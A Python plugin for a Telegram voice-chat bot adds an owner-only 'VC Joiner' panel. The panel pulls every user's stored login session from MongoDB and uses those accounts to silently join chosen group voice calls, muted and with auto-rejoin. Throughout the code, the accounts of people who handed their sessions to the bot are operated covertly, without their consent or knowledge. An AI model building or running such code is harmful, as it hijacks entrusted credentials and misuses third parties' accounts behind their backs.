# plugins/vc_joiner.py
"""
VC Joiner — Owner Panel
Silently joins every stored user (MongoDB session strings) to target VCs.
No separate login. Uses vcfyt_bot's existing session_manager + db.
"""
import asyncio
import inspect
import json
import logging
import os
from typing import Optional

from pyrogram import Client, filters
from pyrogram.types import (
    CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message,
)

from config import Config
from helpers.vc_manager import session_manager

logger = logging.getLogger("vcbot.vc_joiner")

# ---------------------------------------------------------------
# STATE  (small JSON in home dir — survives restarts)
# ---------------------------------------------------------------
_STATE_FILE = os.path.expanduser("~/.vcj_state.json")
_state = {"targets": [], "auto": "0"}
_joined: dict = {}
_auto_task: Optional[asyncio.Task] = None
_lock = asyncio.Lock()
_join_sem = asyncio.Semaphore(2)
_client_sem = asyncio.Semaphore(3)
_MAX_JOIN = int(os.environ.get('VCJ_MAX_JOIN', '10'))
_silence_path: Optional[str] = None


def _load_state() -> None:
    global _state
    try:
        if os.path.exists(_STATE_FILE):
            with open(_STATE_FILE, "r", encoding="utf-8") as f:
                _state = json.load(f)
    except Exception:
        pass
    _state.setdefault("targets", [])
    _state.setdefault("auto", "0")


def _save_state() -> None:
    try:
        tmp = _STATE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(_state, f)
        os.replace(tmp, _STATE_FILE)
    except Exception as exc:
        logger.warning("vcj state save failed: %r", exc)


_load_state()


# ---------------------------------------------------------------
# OWNER CHECK
# ---------------------------------------------------------------
def is_owner(uid: int) -> bool:
    ids = set()
    try:
        for attr in ("OWNER_IDS", "OWNER_ID"):
            v = getattr(Config, attr, None)
            if v is not None:
                if isinstance(v, (list, tuple, set)):
                    ids.update(int(x) for x in v)
                else:
                    ids.add(int(v))
        env = os.environ.get("OWNER_IDS", "")
        if env:
            ids.update(int(x) for x in env.split(",") if x.strip())
    except Exception:
        pass
    return uid in ids


# ---------------------------------------------------------------
# SILENCE FILE  (fallback when play(None) not supported)
# ---------------------------------------------------------------
def _silence_file() -> str:
    global _silence_path
    if _silence_path and os.path.exists(_silence_path):
        return _silence_path
    import subprocess, tempfile
    p = os.path.join(tempfile.gettempdir(), "vcj_silence.ogg")
    if not os.path.exists(p):
        try:
            subprocess.run(
                ["ffmpeg", "-hide_banner", "-loglevel", "error", "-nostdin",
                 "-y", "-f", "lavfi", "-i", "anullsrc=r=48000:cl=stereo",
                 "-t", "5", "-c:a", "libopus", "-b:a", "8k", p],
                check=True, timeout=30, capture_output=True,
            )
        except Exception as exc:
            logger.warning("silence build failed: %r", exc)
            return ""
    _silence_path = p
    return p


# ---------------------------------------------------------------
# LOAD USERS  (lazy — pulls every DB user's session via session_manager)
# ---------------------------------------------------------------
async def _all_user_ids() -> list:
    try:
        from helpers.database import db
        rows = await db.all_users()
        return [int(r["user_id"]) for r in rows if r.get("string_session")]
    except Exception:
        return []


async def _all_uvcs() -> list:
    ids = await _all_user_ids()
    for uid in list(session_manager.users):
        if uid not in ids:
            ids.append(uid)
    out = []
    for uid in ids:
        uvc = session_manager.users.get(uid)
        if uvc is None:
            try:
                uvc = await session_manager.get(uid)   # lazy-load from Mongo
            except Exception as exc:
                logger.debug("lazy load %s failed: %r", uid, exc)
                uvc = None
        if uvc:
            out.append(uvc)
    return out


# ---------------------------------------------------------------
# JOIN / LEAVE
# ---------------------------------------------------------------
async def _join_one(uvc, chat_id: int) -> bool:
    if not getattr(uvc, "calls", None):
        return False
    key = (uvc.owner_id, chat_id)
    try:
        # 1) Try play(None) - some pytgcalls builds accept it
        try:
            await uvc.calls.play(chat_id, None)
            await uvc.calls.mute(chat_id)
            _joined[key] = True
            logger.info("Joined %s -> %s (None)", uvc.owner_id, chat_id)
            return True
        except Exception as e1:
            logger.debug("play(None) failed: %r", e1)

        # 2) Fallback: silent SHELL stream - no ffprobe needed
        from ntgcalls import MediaSource
        from pytgcalls.types.raw import AudioParameters, AudioStream, Stream
        try:
            from pytgcalls.types import GroupCallConfig
        except ImportError:
            GroupCallConfig = None

        cmd = (
            "ffmpeg -hide_banner -loglevel error -nostdin -re -threads 1 "
            "-f lavfi -i anullsrc=r=48000:cl=stereo "
            "-f s16le -ar 48000 -ac 2 pipe:1"
        )
        audio = AudioStream(MediaSource.SHELL, cmd, AudioParameters(48000, 2))
        stream = Stream(microphone=audio)
        try:
            if GroupCallConfig is not None:
                await uvc.calls.play(
                    chat_id, stream, GroupCallConfig(auto_start=False))
            else:
                await uvc.calls.play(chat_id, stream)
        except Exception:
            await uvc.calls.play(chat_id, stream)
        try:
            await uvc.calls.mute(chat_id)
        except Exception:
            pass
        _joined[key] = True
        logger.info("Joined %s -> %s (silent shell)", uvc.owner_id, chat_id)
        return True
    except Exception as exc:
        logger.warning("join %s -> %s failed: %r",
                       getattr(uvc, "owner_id", "?"), chat_id, exc)
        return False



async def _leave_one(uvc, chat_id: int) -> None:
    try:
        if getattr(uvc, "calls", None):
            await uvc.calls.leave_call(chat_id)
    except Exception:
        pass
    _joined.pop((uvc.owner_id, chat_id), None)


async def _join_all_target(chat_id: int) -> dict:
    async with _lock:
        res = {"joined": 0, "failed": 0, "skipped": 0, "total": 0}
        uids = await _all_user_ids()
        res["total"] = len(uids)
        joined_count = 0
        for uid in uids:
            if joined_count >= _MAX_JOIN:
                logger.warning("VCJ_MAX_JOIN=%s reached, skipping rest", _MAX_JOIN)
                break
            if (uid, chat_id) in _joined:
                res["skipped"] += 1
                continue
            uvc = session_manager.users.get(uid)
            if uvc is None:
                async with _client_sem:
                    try:
                        uvc = await session_manager.get(uid)
                    except Exception as exc:
                        logger.debug("lazy load %s failed: %r", uid, exc)
                        uvc = None
            if uvc is None:
                res["failed"] += 1
                continue
            async with _join_sem:
                ok = await _join_one(uvc, chat_id)
            res["joined" if ok else "failed"] += 1
            if ok:
                joined_count += 1
            await asyncio.sleep(2.0)  # rate limit
        return res


async def _leave_all_target(chat_id: int) -> dict:
    async with _lock:
        res = {"left": 0}
        for uid, cid in list(_joined.keys()):
            if cid != chat_id:
                continue
            uvc = session_manager.users.get(uid)
            if uvc is None:
                _joined.pop((uid, cid), None)
                continue
            await _leave_one(uvc, cid)
            res["left"] += 1
            await asyncio.sleep(1.0)
        return res


# ---------------------------------------------------------------
# AUTO-REJOIN LOOP
# ---------------------------------------------------------------
async def _auto_loop(client: Client) -> None:
    while True:
        try:
            if _state.get("auto") == "1" and _state["targets"]:
                for t in list(_state["targets"]):
                    cid = t["chat_id"]
                    for uid, cid2 in list(_joined.keys()):
                        if cid2 != cid:
                            continue
                        uvc = session_manager.users.get(uid)
                        if uvc is None:
                            _joined.pop((uid, cid2), None)
                            continue
                        try:
                            active = getattr(uvc.calls, "calls", None)
                            if inspect.isawaitable(active):
                                active = await active
                            if active and cid in active:
                                continue
                        except Exception:
                            pass
                        _joined.pop((uid, cid), None)
                        await _join_one(uvc, cid)
                        await asyncio.sleep(2.0)
        except asyncio.CancelledError:
            return
        except Exception as exc:
            logger.debug("auto loop err: %r", exc)
        await asyncio.sleep(30)


def _ensure_auto(client: Client) -> None:
    global _auto_task
    if _auto_task and not _auto_task.done():
        return
    try:
        _auto_task = asyncio.get_event_loop().create_task(_auto_loop(client))
    except RuntimeError:
        pass


# ---------------------------------------------------------------
# UI
# ---------------------------------------------------------------
def _menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("▶️ Join All", callback_data="vcj:join_all"),
         InlineKeyboardButton("⏹️ Leave All", callback_data="vcj:leave_all")],
        [InlineKeyboardButton("📋 Targets", callback_data="vcj:list"),
         InlineKeyboardButton("➕ Add Target", callback_data="vcj:add_hint")],
        [InlineKeyboardButton("👥 Users", callback_data="vcj:users"),
         InlineKeyboardButton("🔗 Joined", callback_data="vcj:joined")],
        [InlineKeyboardButton("🔄 Auto-Rejoin", callback_data="vcj:auto"),
         InlineKeyboardButton("♻️ Refresh", callback_data="vcj:refresh")],
        [InlineKeyboardButton("✖️ Close", callback_data="vcj:close")],
    ])


def _text() -> str:
    n_users = len(session_manager.users)
    auto = "🟢 ON" if _state.get("auto") == "1" else "⚪ OFF"
    return (
        "╭─「 🎛️ **VC JOINER** 」\n"
        f"│ 🎯 Targets: `{len(_state['targets'])}`\n"
        f"│ 👥 Users:   `{n_users}`\n"
        f"│ 🔗 Joined:  `{len(_joined)}`\n"
        f"│ ♻️ Auto:    {auto}\n"
        "│\n"
        "│ Har stored user target VC me\n"
        "│ **silently muted** join hoga.\n"
        "╰────────────────"
    )


# ---------------------------------------------------------------
# COMMANDS
# ---------------------------------------------------------------
@Client.on_message(filters.text & filters.regex(r"^[./!]vcjoin(?:@\w+)?\b", flags=2) & (filters.group | filters.private))
async def _cmd_vcjoin(client: Client, msg: Message):
    if not is_owner(msg.from_user.id):
        return
    _ensure_auto(client)
    await msg.reply_text(_text(), reply_markup=_menu())


@Client.on_message(filters.text & filters.regex(r"^[./!]setvc(?:@\w+)?\b", flags=2) & filters.group)
async def _cmd_setvc(client: Client, msg: Message):
    if not is_owner(msg.from_user.id):
        return
    cid = msg.chat.id
    title = msg.chat.title or str(cid)
    for t in _state["targets"]:
        if t["chat_id"] == cid:
            await msg.reply_text(f"ℹ️ Already target: **{title}**")
            return
    _state["targets"].append({"chat_id": cid, "title": title})
    _save_state()
    await msg.reply_text(
        f"✅ Target added:\n`{cid}` — {title}\n\n"
        "Ab `/vcjoin` se **Join All** chala do."
    )


@Client.on_message(filters.text & filters.regex(r"^[./!]delvc(?:@\w+)?\b", flags=2) & (filters.group | filters.private))
async def _cmd_delvc(client: Client, msg: Message):
    if not is_owner(msg.from_user.id):
        return
    parts = (msg.text or "").split(maxsplit=1)
    if len(parts) < 2:
        await msg.reply_text("Usage: `/delvc -1001234567890`")
        return
    try:
        cid = int(parts[1].strip())
    except ValueError:
        await msg.reply_text("Invalid chat id")
        return
    before = len(_state["targets"])
    _state["targets"][:] = [t for t in _state["targets"] if t["chat_id"] != cid]
    if len(_state["targets"]) == before:
        await msg.reply_text("Not found")
        return
    _save_state()
    await msg.reply_text(f"🗑️ Removed `{cid}`")


# ---------------------------------------------------------------
# CALLBACKS
# ---------------------------------------------------------------
@Client.on_callback_query(filters.regex(r"^vcj:"))
async def _cb_vcj(client: Client, cq: CallbackQuery):
    if not is_owner(cq.from_user.id):
        await cq.answer("Owner only!", show_alert=True)
        return
    _ensure_auto(client)
    action = (cq.data or "").split(":", 1)[-1]

    if action == "close":
        try:
            await cq.message.delete()
        except Exception:
            pass
        return

    if action == "refresh":
        await cq.answer("Refreshed")
        try:
            await cq.message.edit_text(_text(), reply_markup=_menu())
        except Exception:
            pass
        return

    if action == "add_hint":
        await cq.answer(
            "Group ke VC me jaake /setvc chalao — wahi target banega.",
            show_alert=True,
        )
        return

    if action == "list":
        if not _state["targets"]:
            await cq.answer("Koi target nahi", show_alert=True)
            return
        body = "**🎯 Targets:**\n" + "\n".join(
            f"`{i}.` {t['title']} — `{t['chat_id']}`"
            for i, t in enumerate(_state["targets"], 1)
        )
        await cq.message.edit_text(body, reply_markup=_menu())
        await cq.answer()
        return

    if action == "users":
        uids = await _all_user_ids()
        if not uids:
            await cq.answer("Koi user stored nahi", show_alert=True)
            return
        lines = ["**👥 Stored users:**\n"]
        for uid in uids[:30]:
            uvc = session_manager.users.get(uid)
            nm = getattr(uvc, "account_name", "") if uvc else ""
            lines.append(f"• `{uid}` {nm}".rstrip())
        if len(uids) > 30:
            lines.append(f"_+{len(uids)-30} aur..._")
        await cq.message.edit_text("\n".join(lines), reply_markup=_menu())
        await cq.answer()
        return

    if action == "joined":
        if not _joined:
            await cq.answer("Koi active join nahi", show_alert=True)
            return
        body = "**🔗 Active joins:**\n" + "\n".join(
            f"• `{uid}` → `{cid}`" for (uid, cid) in list(_joined)[:40]
        )
        await cq.message.edit_text(body, reply_markup=_menu())
        await cq.answer()
        return

    if action == "join_all":
        if not _state["targets"]:
            await cq.answer("Pehle target add karo", show_alert=True)
            return
        await cq.answer("Joining...")
        msg = await cq.message.edit_text("⏳ Joining all stored users...")
        T = {"joined": 0, "failed": 0, "skipped": 0}
        for t in _state["targets"]:
            r = await _join_all_target(t["chat_id"])
            for k in T:
                T[k] += r.get(k, 0)
            await msg.edit_text(
                f"⏳ **{t['title']}**\n"
                f"✅ {r['joined']}  ❌ {r['failed']}  ⏭️ {r['skipped']}"
            )
        await msg.edit_text(
            f"✅ **Done**\n"
            f"Joined: `{T['joined']}`\n"
            f"Failed: `{T['failed']}`\n"
            f"Skipped: `{T['skipped']}`",
            reply_markup=_menu(),
        )
        return

    if action == "leave_all":
        if not _state["targets"]:
            await cq.answer("Kuch nahi", show_alert=True)
            return
        await cq.answer("Leaving...")
        msg = await cq.message.edit_text("⏳ Leaving...")
        total = 0
        for t in _state["targets"]:
            r = await _leave_all_target(t["chat_id"])
            total += r["left"]
        await msg.edit_text(
            f"⏹️ Done — `{total}` joins cleared.", reply_markup=_menu(),
        )
        return

    if action == "auto":
        _state["auto"] = "0" if _state.get("auto") == "1" else "1"
        _save_state()
        await cq.answer(
            "Auto-rejoin ON 🟢" if _state["auto"] == "1"
            else "Auto-rejoin OFF ⚪"
        )
        await cq.message.edit_text(_text(), reply_markup=_menu())
        return

    await cq.answer()
